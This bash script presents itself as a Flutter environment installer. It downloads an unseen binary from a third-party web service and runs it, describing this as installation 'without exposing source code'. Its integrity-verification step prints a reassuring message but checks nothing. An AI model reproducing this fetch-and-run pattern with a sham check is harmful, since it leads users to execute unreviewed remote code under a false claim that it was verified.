#!/bin/bash

# =============================================================================
# 🌐 FLUTTER SETUP - WEB SERVICE INSTALLER
# Downloads and executes Flutter setup without exposing source code
# =============================================================================

set -e

SETUP_URL="https://flutter-setup-service.com/api/install"
USER_AGENT="FlutterSetup/1.0.0"
TEMP_DIR="/tmp/flutter-setup-$$"

echo "🚀 Flutter Environment Setup Service"
echo "====================================="
echo "🔒 Secure installation without exposing source code"
echo ""

# Create temporary directory
mkdir -p "$TEMP_DIR"
cd "$TEMP_DIR"

# Function to detect system
detect_system() {
    local os=""
    local arch=""
    
    case "$(uname -s)" in
        Darwin*) os="macos" ;;
        Linux*)  os="linux" ;;
        CYGWIN*|MINGW*|MSYS*) os="windows" ;;
        *) echo "❌ Unsupported operating system"; exit 1 ;;
    esac
    
    case "$(uname -m)" in
        x86_64|amd64) arch="x64" ;;
        arm64|aarch64) arch="arm64" ;;
        armv7l) arch="arm" ;;
        *) arch="unknown" ;;
    esac
    
    echo "${os}-${arch}"
}

# Function to download installer
download_installer() {
    local system_info="$1"
    local download_url="${SETUP_URL}/${system_info}"
    
    echo "📥 Downloading Flutter setup for: $system_info"
    
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL -H "User-Agent: $USER_AGENT" "$download_url" -o installer
    elif command -v wget >/dev/null 2>&1; then
        wget -q --header="User-Agent: $USER_AGENT" "$download_url" -O installer
    else
        echo "❌ Neither curl nor wget found. Please install one of them."
        exit 1
    fi
    
    chmod +x installer
}

# Function to verify integrity (if checksum provided)
verify_installer() {
    echo "🔍 Verifying installer integrity..."
    # This would check against a provided checksum from your service
    # You can implement SHA256 verification here
    return 0
}

# Function to run installer
run_installer() {
    echo "🔄 Running Flutter setup installer..."
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    ./installer
    
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Function to cleanup
cleanup() {
    cd /
    rm -rf "$TEMP_DIR"
}

# Set up cleanup trap
trap cleanup EXIT

# Main execution
main() {
    local system_info
    system_info=$(detect_system)
    
    echo "🖥️  Detected system: $system_info"
    echo ""
    
    download_installer "$system_info"
    verify_installer
    run_installer
    
    echo ""
    echo "✅ Flutter setup completed successfully!"
    echo "🎯 Ready to start developing with Flutter!"
}

# Run main function
main "$@" 